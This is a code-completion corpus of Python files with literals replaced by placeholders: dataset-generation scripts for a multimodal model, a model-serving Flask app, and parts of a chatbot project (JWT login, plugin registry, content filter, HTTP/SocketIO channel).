<s> from typing import List <EOL> import argparse <EOL> import json <EOL> import os <EOL> import random <EOL> import openai <EOL> from datasets import Dataset , load_dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> PROMPT = <EOL> QUESTIONS = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> OPENAI_TOOLS = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" ] , <EOL> } , <EOL> } , <EOL> } <EOL> ] <EOL> def _build_convo ( pretrain_examples ) -> List : <EOL> client = openai . Client ( ) <EOL> captions = [ e [ "<STR_LIT>" ] [ <NUM_LIT> ] [ "<STR_LIT>" ] for e in pretrain_examples ] <EOL> paths = [ e [ "<STR_LIT>" ] [ <NUM_LIT> ] for e in pretrain_examples ] <EOL> captions_text = "<STR_LIT>" . join ( <EOL> [ f"<STR_LIT>" for i , cap in enumerate ( captions ) ] <EOL> ) <EOL> prompt = PROMPT . format ( <EOL> captions = captions_text , question = random . choice ( QUESTIONS ) <EOL> ) . strip ( ) <EOL> completion = client . chat . completions . create ( <EOL> model = "<STR_LIT>" , <EOL> messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : prompt } ] , <EOL> tools = OPENAI_TOOLS , <EOL> tool_choice = { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" } } , <EOL> ) <EOL> resp = json . loads ( completion . choices [ <NUM_LIT> ] . message . tool_calls [ <NUM_LIT> ] . function . arguments ) <EOL> if "<STR_LIT>" not in resp : <EOL> print ( resp ) <EOL> q = resp [ "<STR_LIT>" ] <EOL> a = resp [ "<STR_LIT>" ] <EOL> if random . choice ( [ True , False ] ) : <EOL> q = "<STR_LIT>" * len ( captions ) + "<STR_LIT>" + q <EOL> else : <EOL> q = q + "<STR_LIT>" + "<STR_LIT>" * len ( captions ) <EOL> example = { <EOL> "<STR_LIT>" : paths , <EOL> "<STR_LIT>" : [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : q , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : a , <EOL> } , <EOL> ] , <EOL> } <EOL> return example <EOL> def main ( args ) : <EOL> data = load_dataset ( "<STR_LIT>" , split = "<STR_LIT>" , data_files = "<STR_LIT>" ) <EOL> data_idxs = list ( range ( len ( data ) ) ) <EOL> os . makedirs ( args . cache_folder , exist_ok = True ) <EOL> def gen ( seeds ) : <EOL> r = random . Random ( seeds [ <NUM_LIT> ] ) <EOL> cache = open ( <EOL> os . path . join ( args . cache_folder , f"<STR_LIT>" ) , "<STR_LIT>" <EOL> ) <EOL> i = <NUM_LIT> <EOL> while i < len ( seeds ) : <EOL> k = r . randint ( <NUM_LIT> , args . max_images ) <EOL> selected_idxs = r . sample ( data_idxs , k = k ) <EOL> selected_examples = [ data [ i ] for i in selected_idxs ] <EOL> try : <EOL> example = _build_convo ( selected_examples ) <EOL> cache . write ( json . dumps ( example ) + "<STR_LIT>" ) <EOL> yield example <EOL> i += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( e ) <EOL> continue <EOL> cache . close ( ) <EOL> ds = Dataset . from_generator ( <EOL> gen , <EOL> num_proc = args . num_proc , <EOL> gen_kwargs = { "<STR_LIT>" : list ( range ( args . num_examples ) ) } , <EOL> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List <EOL> import random <EOL> import argparse <EOL> from datasets import load_dataset <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> from multi_token . modalities . document_gte import ( <EOL> split_text_into_documents , <EOL> ) <EOL> TEMP_TOKEN = "<STR_LIT>" <EOL> PRETRAIN_PHRASES = [ <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> f"<STR_LIT>" , <EOL> ] <EOL> def _write_convo ( row , max_document_chunks ) -> List : <EOL> docs = split_text_into_documents ( row [ "<STR_LIT>" ] ) <EOL> if len ( docs ) > max_document_chunks : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> example = { <EOL> "<STR_LIT>" : str ( row [ "<STR_LIT>" ] ) , <EOL> "<STR_LIT>" : docs , <EOL> } <EOL> phrase = random . choice ( PRETRAIN_PHRASES ) <EOL> example [ "<STR_LIT>" ] = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : phrase . replace ( TEMP_TOKEN , "<STR_LIT>" * len ( docs ) ) , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : row [ "<STR_LIT>" ] , <EOL> } , <EOL> ] <EOL> return example <EOL> def main ( args ) : <EOL> wiki_data = load_dataset ( "<STR_LIT>" , "<STR_LIT>" ) [ "<STR_LIT>" ] <EOL> idxs = list ( range ( len ( wiki_data ) ) ) <EOL> random . shuffle ( idxs ) <EOL> def gen ( ) : <EOL> i = <NUM_LIT> <EOL> for idx in idxs : <EOL> row = wiki_data [ idx ] <EOL> try : <EOL> yield _write_convo ( row , args . max_document_chunks ) <EOL> except ValueError : <EOL> pass <EOL> else : <EOL> i += <NUM_LIT> <EOL> if i >= args . max_examples : <EOL> break <EOL> ds = Dataset . from_generator ( gen ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> import argparse <EOL> import shutil <EOL> import os <EOL> from huggingface_hub import HfApi <EOL> USEFUL_FILES = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> def main ( args ) : <EOL> api = HfApi ( ) <EOL> api . create_repo ( args . repo , exist_ok = True , repo_type = "<STR_LIT>" ) <EOL> checkpoints = [ fn for fn in os . listdir ( args . model_folder ) if fn . startswith ( "<STR_LIT>" ) ] <EOL> checkpoints . sort ( key = lambda x : int ( x . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] ) ) <EOL> if ( <EOL> not os . path . exists ( os . path . join ( args . model_folder , "<STR_LIT>" ) ) <EOL> and len ( checkpoints ) > <NUM_LIT> <EOL> ) : <EOL> last_checkpoint = os . path . join ( args . model_folder , checkpoints [ - <NUM_LIT> ] ) <EOL> for fn in USEFUL_FILES : <EOL> checkpoint_fn = os . path . join ( last_checkpoint , fn ) <EOL> new_fn = os . path . join ( args . model_folder , fn ) <EOL> if os . path . exists ( checkpoint_fn ) and not os . path . exists ( new_fn ) : <EOL> shutil . copy ( checkpoint_fn , args . model_folder ) <EOL> api . upload_folder ( <EOL> repo_id = args . repo , allow_patterns = USEFUL_FILES , folder_path = args . model_folder <EOL> ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import json <EOL> import os <EOL> import random <EOL> import openai <EOL> from datasets import Dataset , load_dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> PROMPT = <EOL> QUESTIONS = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> OPENAI_TOOLS = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" ] , <EOL> } , <EOL> } , <EOL> } <EOL> ] <EOL> def _build_convo ( row ) -> List : <EOL> client = openai . Client ( ) <EOL> captions = [ row [ "<STR_LIT>" ] ] <EOL> paths = [ row [ "<STR_LIT>" ] ] <EOL> captions_text = "<STR_LIT>" . join ( [ f"<STR_LIT>" for i , cap in enumerate ( captions ) ] ) <EOL> prompt = PROMPT . format ( <EOL> captions = captions_text , question = random . choice ( QUESTIONS ) <EOL> ) . strip ( ) <EOL> completion = client . chat . completions . create ( <EOL> model = "<STR_LIT>" , <EOL> messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : prompt } ] , <EOL> tools = OPENAI_TOOLS , <EOL> tool_choice = { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" } } , <EOL> ) <EOL> resp = json . loads ( completion . choices [ <NUM_LIT> ] . message . tool_calls [ <NUM_LIT> ] . function . arguments ) <EOL> if "<STR_LIT>" not in resp : <EOL> print ( resp ) <EOL> q = resp [ "<STR_LIT>" ] <EOL> a = resp [ "<STR_LIT>" ] <EOL> if random . choice ( [ True , False ] ) : <EOL> q = "<STR_LIT>" * len ( captions ) + "<STR_LIT>" + q <EOL> else : <EOL> q = q + "<STR_LIT>" + "<STR_LIT>" * len ( captions ) <EOL> example = { <EOL> "<STR_LIT>" : paths , <EOL> "<STR_LIT>" : [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : q , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : a , <EOL> } , <EOL> ] , <EOL> } <EOL> return example <EOL> def main ( args ) : <EOL> data = load_dataset ( "<STR_LIT>" , split = "<STR_LIT>" ) <EOL> data_idxs = list ( range ( len ( data ) ) ) <EOL> os . makedirs ( args . cache_folder , exist_ok = True ) <EOL> def gen ( seeds ) : <EOL> r = random . Random ( seeds [ <NUM_LIT> ] + <NUM_LIT> ) <EOL> cache = open ( <EOL> os . path . join ( args . cache_folder , f"<STR_LIT>" ) , "<STR_LIT>" <EOL> ) <EOL> i = <NUM_LIT> <EOL> while i < len ( seeds ) : <EOL> selected_idxs = r . sample ( data_idxs , k = <NUM_LIT> ) [ <NUM_LIT> ] <EOL> selected_example = data [ selected_idxs ] <EOL> try : <EOL> example = _build_convo ( selected_example ) <EOL> cache . write ( json . dumps ( example ) + "<STR_LIT>" ) <EOL> yield example <EOL> i += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( e ) <EOL> continue <EOL> cache . close ( ) <EOL> ds = Dataset . from_generator ( <EOL> gen , <EOL> num_proc = args . num_proc , <EOL> gen_kwargs = { "<STR_LIT>" : list ( range ( args . num_examples ) ) } , <EOL> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from dataclasses import dataclass , field <EOL> import logging <EOL> from flask import Flask , request , jsonify <EOL> import transformers <EOL> import torch <EOL> from multi_token . training import ( <EOL> ModelArguments , <EOL> ) <EOL> from multi_token . inference import load_trained_lora_model <EOL> from multi_token . data_tools import encode_chat <EOL> @ dataclass <EOL> class ServeArguments ( ModelArguments ) : <EOL> port : int = field ( default = <NUM_LIT> ) <EOL> host : str = field ( default = "<STR_LIT>" ) <EOL> load_bits : int = field ( default = <NUM_LIT> ) <EOL> max_new_tokens : int = field ( default = <NUM_LIT> ) <EOL> temperature : float = field ( default = <NUM_LIT> ) <EOL> if __name__ == "<STR_LIT>" : <EOL> logging . getLogger ( ) . setLevel ( logging . INFO ) <EOL> parser = transformers . HfArgumentParser ( ( ServeArguments , ) ) <EOL> serve_args , _ = parser . parse_args_into_dataclasses ( return_remaining_strings = True ) <EOL> model , tokenizer = load_trained_lora_model ( <EOL> model_name_or_path = serve_args . model_name_or_path , <EOL> model_lora_path = serve_args . model_lora_path , <EOL> load_bits = serve_args . load_bits , <EOL> ) <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" ] ) <EOL> def generate ( ) : <EOL> req_json = request . get_json ( ) <EOL> encoded_dict = encode_chat ( req_json , tokenizer , model . modalities ) <EOL> with torch . inference_mode ( ) : <EOL> output_ids = model . generate ( <EOL> input_ids = encoded_dict [ "<STR_LIT>" ] . unsqueeze ( <NUM_LIT> ) . to ( model . device ) , <EOL> max_new_tokens = serve_args . max_new_tokens , <EOL> use_cache = True , <EOL> do_sample = True , <EOL> temperature = serve_args . temperature , <EOL> modality_inputs = { <EOL> m . name : [ encoded_dict [ m . name ] ] for m in model . modalities <EOL> } , <EOL> ) <EOL> outputs = tokenizer . decode ( <EOL> output_ids [ <NUM_LIT> , encoded_dict [ "<STR_LIT>" ] . shape [ <NUM_LIT> ] : ] , <EOL> skip_special_tokens = True , <EOL> ) . strip ( ) <EOL> return jsonify ( { "<STR_LIT>" : outputs } ) <EOL> app . run ( host = serve_args . host , port = serve_args . port ) <EOL> </s>
<s> import jwt <EOL> import datetime <EOL> import time <EOL> from flask import jsonify , request <EOL> from common import const <EOL> from config import channel_conf <EOL> class Auth ( ) : <EOL> def __init__ ( self , login ) : <EOL> self . login = login <EOL> super ( Auth , self ) . __init__ ( ) <EOL> @ staticmethod <EOL> def encode_auth_token ( user_id , login_time ) : <EOL> try : <EOL> payload = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : datetime . datetime . utcnow ( ) + datetime . timedelta ( days = <NUM_LIT> , hours = <NUM_LIT> ) , <EOL> '<STR_LIT>' : datetime . datetime . utcnow ( ) , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : user_id , <EOL> '<STR_LIT>' : login_time <EOL> } <EOL> } <EOL> return jwt . encode ( <EOL> payload , <EOL> channel_conf ( const . HTTP ) . get ( '<STR_LIT>' ) , <EOL> algorithm = '<STR_LIT>' <EOL> ) <EOL> except Exception as e : <EOL> return e <EOL> @ staticmethod <EOL> def decode_auth_token ( auth_token ) : <EOL> try : <EOL> payload = jwt . decode ( auth_token , channel_conf ( const . HTTP ) . get ( <EOL> '<STR_LIT>' ) , algorithms = '<STR_LIT>' ) <EOL> if ( '<STR_LIT>' in payload and '<STR_LIT>' in payload [ '<STR_LIT>' ] ) : <EOL> return payload <EOL> else : <EOL> raise jwt . InvalidTokenError <EOL> except jwt . ExpiredSignatureError : <EOL> return '<STR_LIT>' <EOL> except jwt . InvalidTokenError : <EOL> return '<STR_LIT>' <EOL> def authenticate ( password ) : <EOL> authPassword = channel_conf ( const . HTTP ) . get ( '<STR_LIT>' ) <EOL> if ( authPassword != password ) : <EOL> return False <EOL> else : <EOL> login_time = time . strftime ( "<STR_LIT>" , time . localtime ( ) ) <EOL> token = Auth . encode_auth_token ( password , login_time ) <EOL> return token <EOL> def identify ( request ) : <EOL> try : <EOL> authPassword = channel_conf ( const . HTTP ) . get ( '<STR_LIT>' ) <EOL> if ( not authPassword ) : <EOL> return True <EOL> if ( request is None ) : <EOL> return False <EOL> authorization = request . cookies . get ( '<STR_LIT>' ) <EOL> if ( authorization ) : <EOL> payload = Auth . decode_auth_token ( authorization ) <EOL> if not isinstance ( payload , str ) : <EOL> authPassword = channel_conf ( <EOL> const . HTTP ) . get ( '<STR_LIT>' ) <EOL> password = payload [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> if ( password != authPassword ) : <EOL> return False <EOL> else : <EOL> return True <EOL> return False <EOL> except jwt . ExpiredSignatureError : <EOL> return False <EOL> except jwt . InvalidTokenError : <EOL> return False <EOL> </s>
<s> from . event import * <EOL> from . plugin import * <EOL> from plugins . plugin_registry import PluginRegistry <EOL> instance = PluginRegistry ( ) <EOL> register = instance . register <EOL> </s>
<s> TERMINAL = "<STR_LIT>" <EOL> WECHAT = "<STR_LIT>" <EOL> WECHAT_MP = "<STR_LIT>" <EOL> WECHAT_MP_SERVICE = "<STR_LIT>" <EOL> WECHAT_COM = "<STR_LIT>" <EOL> QQ = "<STR_LIT>" <EOL> GMAIL = "<STR_LIT>" <EOL> TELEGRAM = "<STR_LIT>" <EOL> SLACK = "<STR_LIT>" <EOL> HTTP = "<STR_LIT>" <EOL> DINGTALK = "<STR_LIT>" <EOL> FEISHU = "<STR_LIT>" <EOL> DISCORD = "<STR_LIT>" <EOL> OPEN_AI = "<STR_LIT>" <EOL> CHATGPT = "<STR_LIT>" <EOL> BAIDU = "<STR_LIT>" <EOL> BING = "<STR_LIT>" <EOL> BARD = "<STR_LIT>" <EOL> </s>
<s> import requests <EOL> from config import conf <EOL> class SensitiveWord : <EOL> def __init__ ( self ) : <EOL> try : <EOL> self . config = conf ( ) <EOL> except Exception as e : <EOL> print ( e ) <EOL> self . url = "<STR_LIT>" <EOL> self . access_token = self . get_access_token ( ) <EOL> def get_access_token ( self ) : <EOL> if self . config is not None and "<STR_LIT>" in self . config and "<STR_LIT>" in self . config [ "<STR_LIT>" ] and self . config [ "<STR_LIT>" ] [ "<STR_LIT>" ] : <EOL> url = "<STR_LIT>" <EOL> params = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : self . config [ "<STR_LIT>" ] [ "<STR_LIT>" ] , <EOL> "<STR_LIT>" : self . config [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> } <EOL> response = requests . post ( url , params = params ) <EOL> response_json = response . json ( ) <EOL> access_token = response_json . get ( "<STR_LIT>" ) <EOL> if not access_token : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> return access_token <EOL> def process_text ( self , text ) : <EOL> if self . config is not None and "<STR_LIT>" in self . config and "<STR_LIT>" in self . config [ "<STR_LIT>" ] and self . config [ "<STR_LIT>" ] [ "<STR_LIT>" ] : <EOL> url = "<STR_LIT>" <EOL> access_token = self . get_access_token ( ) <EOL> headers = { "<STR_LIT>" : "<STR_LIT>" } <EOL> params = { <EOL> "<STR_LIT>" : text . encode ( "<STR_LIT>" ) , <EOL> "<STR_LIT>" : access_token <EOL> } <EOL> response = requests . post ( url , data = params , headers = headers ) <EOL> if response . status_code != <NUM_LIT> : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> conclusion_type = response . json ( ) . get ( "<STR_LIT>" ) <EOL> print ( response . json ( ) ) <EOL> if conclusion_type in [ <NUM_LIT> , None ] : <EOL> return False <EOL> else : <EOL> return True <EOL> else : <EOL> return False <EOL> </s>
<s> import inspect <EOL> from plugins . plugin import Plugin <EOL> from common . log import logger <EOL> from common import functions <EOL> @ functions . singleton <EOL> class PluginRegistry : <EOL> def __init__ ( self ) : <EOL> self . plugins = [ ] <EOL> def register ( self , name : str , desire_priority : int = <NUM_LIT> , ** kwargs ) : <EOL> def wrapper ( plugin_cls ) : <EOL> plugin_cls . name = name <EOL> plugin_cls . priority = desire_priority <EOL> plugin_cls . desc = kwargs . get ( '<STR_LIT>' ) <EOL> plugin_cls . author = kwargs . get ( '<STR_LIT>' ) <EOL> plugin_cls . version = kwargs . get ( '<STR_LIT>' ) or "<STR_LIT>" <EOL> plugin_cls . namecn = kwargs . get ( '<STR_LIT>' ) or name <EOL> plugin_cls . hidden = kwargs . get ( '<STR_LIT>' ) or False <EOL> plugin_cls . enabled = kwargs . get ( '<STR_LIT>' ) or True <EOL> logger . info ( f"<STR_LIT>" ) <EOL> return plugin_cls <EOL> return wrapper <EOL> def register_from_module ( self , module ) : <EOL> plugins = [ ] <EOL> for name , obj in inspect . getmembers ( module ) : <EOL> if inspect . isclass ( obj ) and issubclass ( obj , Plugin ) and obj != Plugin : <EOL> plugin_name = getattr ( obj , "<STR_LIT>" , None ) <EOL> if plugin_name : <EOL> plugin = obj ( ) <EOL> plugin . name = plugin_name <EOL> plugin . priority = getattr ( obj , "<STR_LIT>" , <NUM_LIT> ) <EOL> plugin . desc = getattr ( obj , "<STR_LIT>" , None ) <EOL> plugin . author = getattr ( obj , "<STR_LIT>" , None ) <EOL> plugin . version = getattr ( obj , "<STR_LIT>" , "<STR_LIT>" ) <EOL> plugin . namecn = getattr ( obj , "<STR_LIT>" , plugin_name ) <EOL> plugin . hidden = getattr ( obj , "<STR_LIT>" , False ) <EOL> plugin . enabled = getattr ( obj , "<STR_LIT>" , True ) <EOL> self . plugins . append ( plugin ) <EOL> self . plugins . sort ( key = lambda x : x . priority , reverse = True ) <EOL> def get_plugin ( self , name ) : <EOL> plugin = next ( ( p for p in self . plugins if p . name . upper ( ) == name . upper ( ) ) , None ) <EOL> return plugin <EOL> def list_plugins ( self ) : <EOL> return [ plugin for plugin in self . plugins ] <EOL> </s>
<s> class Model ( object ) : <EOL> def reply ( self , query , context = None ) : <EOL> raise NotImplementedError <EOL> </s>
<s> import asyncio <EOL> import json <EOL> from channel . http import auth <EOL> from flask import Flask , request , render_template , make_response <EOL> from datetime import timedelta <EOL> from common import const <EOL> from common import functions <EOL> from config import channel_conf <EOL> from config import channel_conf_val <EOL> from channel . channel import Channel <EOL> from flask_socketio import SocketIO <EOL> from common import log <EOL> from plugins . plugin_manager import * <EOL> http_app = Flask ( __name__ , ) <EOL> socketio = SocketIO ( http_app , close_timeout = <NUM_LIT> ) <EOL> http_app . jinja_env . auto_reload = True <EOL> http_app . config [ '<STR_LIT>' ] = True <EOL> http_app . config [ '<STR_LIT>' ] = timedelta ( seconds = <NUM_LIT> ) <EOL> async def return_stream ( data ) : <EOL> async for final , response in HttpChannel ( ) . handle_stream ( data = data ) : <EOL> try : <EOL> if ( final ) : <EOL> socketio . server . emit ( <EOL> '<STR_LIT>' , { '<STR_LIT>' : response , '<STR_LIT>' : final } , request . sid , namespace = "<STR_LIT>" ) <EOL> disconnect ( ) <EOL> else : <EOL> socketio . server . emit ( <EOL> '<STR_LIT>' , { '<STR_LIT>' : response , '<STR_LIT>' : final } , request . sid , namespace = "<STR_LIT>" ) <EOL> except Exception as e : <EOL> disconnect ( ) <EOL> log . warn ( "<STR_LIT>" , e ) <EOL> break <EOL> @ socketio . on ( '<STR_LIT>' , namespace = '<STR_LIT>' ) <EOL> def stream ( data ) : <EOL> if ( auth . identify ( request ) == False ) : <EOL> client_sid = request . sid <EOL> socketio . server . disconnect ( client_sid ) <EOL> return <EOL> data = json . loads ( data [ "<STR_LIT>" ] ) <EOL> if ( data ) : <EOL> img_match_prefix = functions . check_prefix ( <EOL> data [ "<STR_LIT>" ] , channel_conf_val ( const . HTTP , '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> reply_text = HttpChannel ( ) . handle ( data = data ) <EOL> socketio . emit ( <EOL> '<STR_LIT>' , { '<STR_LIT>' : reply_text } , namespace = '<STR_LIT>' ) <EOL> disconnect ( ) <EOL> return <EOL> asyncio . run ( return_stream ( data ) ) <EOL> @ socketio . on ( '<STR_LIT>' , namespace = '<STR_LIT>' ) <EOL> def connect ( ) : <EOL> log . info ( '<STR_LIT>' ) <EOL> socketio . emit ( '<STR_LIT>' , { '<STR_LIT>' : "<STR_LIT>" } , namespace = '<STR_LIT>' ) <EOL> @ socketio . on ( '<STR_LIT>' , namespace = '<STR_LIT>' ) <EOL> def disconnect ( ) : <EOL> log . info ( '<STR_LIT>' ) <EOL> socketio . server . disconnect ( request . sid , namespace = "<STR_LIT>" ) <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def chat ( ) : <EOL> if ( auth . identify ( request ) == False ) : <EOL> return <EOL> data = json . loads ( request . data ) <EOL> if data : <EOL> msg = data [ '<STR_LIT>' ] <EOL> if not msg : <EOL> return <EOL> reply_text = HttpChannel ( ) . handle ( data = data ) <EOL> return { '<STR_LIT>' : reply_text } <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' ] ) <EOL> def index ( ) : <EOL> if ( auth . identify ( request ) == False ) : <EOL> return login ( ) <EOL> return render_template ( '<STR_LIT>' ) <EOL> @ http_app . route ( "<STR_LIT>" , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def login ( ) : <EOL> response = make_response ( "<STR_LIT>" , <NUM_LIT> ) <EOL> response . headers . add_header ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> response . headers . add_header ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if ( auth . identify ( request ) == True ) : <EOL> return response <EOL> else : <EOL> if request . method == "<STR_LIT>" : <EOL> token = auth . authenticate ( request . form [ '<STR_LIT>' ] ) <EOL> if ( token != False ) : <EOL> response . set_cookie ( key = '<STR_LIT>' , value = token ) <EOL> return response <EOL> else : <EOL> return render_template ( '<STR_LIT>' ) <EOL> response . headers . set ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> return response <EOL> class HttpChannel ( Channel ) : <EOL> def startup ( self ) : <EOL> http_app . run ( host = '<STR_LIT>' , port = channel_conf ( const . HTTP ) . get ( '<STR_LIT>' ) ) <EOL> def handle ( self , data ) : <EOL> context = dict ( ) <EOL> query = data [ "<STR_LIT>" ] <EOL> id = data [ "<STR_LIT>" ] <EOL> context [ '<STR_LIT>' ] = str ( id ) <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_HANDLE_CONTEXT , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : query , "<STR_LIT>" : context } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> if not e_context . is_pass ( ) : <EOL> reply = super ( ) . build_reply_content ( e_context [ "<STR_LIT>" ] , e_context [ "<STR_LIT>" ] ) <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_DECORATE_REPLY , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : context , '<STR_LIT>' : reply , "<STR_LIT>" : context } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> return reply <EOL> async def handle_stream ( self , data ) : <EOL> context = dict ( 